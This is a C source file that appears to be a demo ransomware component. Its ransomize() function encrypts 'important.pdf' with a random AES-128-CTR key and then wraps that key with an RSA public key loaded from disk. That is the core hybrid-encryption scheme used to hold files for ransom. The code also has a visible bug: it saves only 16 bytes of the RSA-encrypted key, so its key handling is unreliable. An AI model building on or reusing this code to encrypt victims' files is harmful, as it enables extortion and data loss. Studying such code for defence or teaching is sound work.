#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>

#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/pem.h>

#include "get_dir.h"

#define KEY_SIZE 16
#define IV_SIZE 16
#define MAX_PATH 260

/* Error handler */
void handle_error(const char *msg)
{
    fprintf(stderr, "Error: %s\n", msg);
    exit(EXIT_FAILURE);
}

/* Generate a 16-byte IV for AES-128-CTR: 8-byte nonce + 8-byte counter initialized to 0 */
void make_ctr_iv(unsigned char iv[16])
{
    uint64_t nonce;
    uint64_t counter = 0;

    if (RAND_bytes((unsigned char*)&nonce, sizeof(nonce)) != 1)
        handle_error("RAND_bytes failed for nonce");

    //Convert to big-endian for CTR mode
    for (int i = 0; i < 8; i++) {
        iv[i] = (nonce >> (56 - i * 8)) & 0xFF;
        iv[8 + i] = (counter >> (56 - i * 8)) & 0xFF;
    }
}

/* Save generated key to a .bin file */
int save_key_to_file(const char *path, const unsigned char *key, size_t key_len)
{
    FILE *f = fopen(path, "wb");
    if (!f) return 0;

    if (fwrite(key, 1, key_len, f) != key_len) {
        fclose(f);
        return 0;
    }

    fclose(f);
    return 1;
}

EVP_PKEY *load_public_key(const char *path)
{
    FILE *f = fopen(path, "rb");
    if (!f) handle_error("Cannot open public key");

    EVP_PKEY *pkey = PEM_read_PUBKEY(f, NULL, NULL, NULL);
    fclose(f);

    if (!pkey) handle_error("Failed to read public key");
    return pkey;
}

int rsa_encrypt_key(EVP_PKEY *pubkey, const unsigned char *key, size_t key_len, unsigned char **enc_key, size_t *enc_len)
{
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(pubkey, NULL);
    if (!ctx) return 0;

    if (EVP_PKEY_encrypt_init(ctx) <= 0) return 0;
    if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0) return 0;

    // Determine output size
    if (EVP_PKEY_encrypt(ctx, NULL, enc_len, key, key_len) <= 0)
        return 0;

    *enc_key = malloc(*enc_len);
    if (!*enc_key) return 0;

    if (EVP_PKEY_encrypt(ctx, *enc_key, enc_len, key, key_len) <= 0)
        return 0;

    EVP_PKEY_CTX_free(ctx);
    return 1;
}

/* Encrypt a file with AES-128-CTR */
int encrypt_file_aes_ctr(const char *source, const char *target)
{
    FILE *infile = fopen(source, "rb");
    if (!infile) handle_error("Cannot open input file");

    FILE *outfile = fopen(target, "wb");
    if (!outfile) {
        fclose(infile);
        handle_error("Cannot open output file");
    }

    unsigned char key[KEY_SIZE];
    unsigned char iv[IV_SIZE];

    // Generate random key and IV 
    if (RAND_bytes(key, KEY_SIZE) != 1) handle_error("RAND_bytes failed for key");
    make_ctr_iv(iv);

    // Write IV at the start of the file
    if (fwrite(iv, 1, IV_SIZE, outfile) != IV_SIZE) handle_error("Failed to write IV");

    // Setup encrpytion context
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) handle_error("Failed to create EVP context");

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_ctr(), NULL, key, iv))
        handle_error("EVP_EncryptInit_ex failed");

    /* ENCRYPTION */
    unsigned char inbuf[4096];
    unsigned char outbuf[4096 + EVP_MAX_BLOCK_LENGTH];
    int outlen;

    size_t nread;
    while ((nread = fread(inbuf, 1, sizeof(inbuf), infile)) > 0) {
        if (1 != EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, (int)nread))
            handle_error("EVP_EncryptUpdate failed");
        if (fwrite(outbuf, 1, outlen, outfile) != (size_t)outlen)
            handle_error("Failed to write ciphertext");
    }

    // Finalize
    if (1 != EVP_EncryptFinal_ex(ctx, outbuf, &outlen))
        handle_error("EVP_EncryptFinal_ex failed");
    if (outlen > 0) {
        if (fwrite(outbuf, 1, outlen, outfile) != (size_t)outlen)
            handle_error("Failed to write final block");
    }

    // Cleanup
    EVP_CIPHER_CTX_free(ctx);
    fclose(infile);
    fclose(outfile);

    // Save the key
    char exe_dir[MAX_PATH];
    get_dir(exe_dir, sizeof(exe_dir));

    char rsa_path[MAX_PATH];
    snprintf(rsa_path, sizeof(rsa_path), "%s\\%s", exe_dir, "public_key.pem");

    char key_path[MAX_PATH];
    snprintf(key_path, sizeof(key_path), "%s\\%s", exe_dir, "aes_key.bin");

    EVP_PKEY *pub = load_public_key(rsa_path);

    unsigned char *enc_key = NULL;
    size_t enc_key_len = 0;

    if (!rsa_encrypt_key(pub, key, KEY_SIZE, &enc_key, &enc_key_len))
        handle_error("RSA key encryption failed");

    if (!save_key_to_file(key_path, enc_key, KEY_SIZE)) handle_error("Failed to save key");

    free(enc_key);
    EVP_PKEY_free(pub);

    return 0;
}

int ransomize(void)
{
    char exe_dir[MAX_PATH];
    get_dir(exe_dir, sizeof(exe_dir));

    char input_file[MAX_PATH];
    snprintf(input_file, sizeof(input_file), "%s\\%s", exe_dir, "important.pdf");

    char output_file[MAX_PATH];
    snprintf(output_file, sizeof(output_file), "%s\\%s", exe_dir, "important.enc");

    encrypt_file_aes_ctr(input_file, output_file);

    return 0;
}
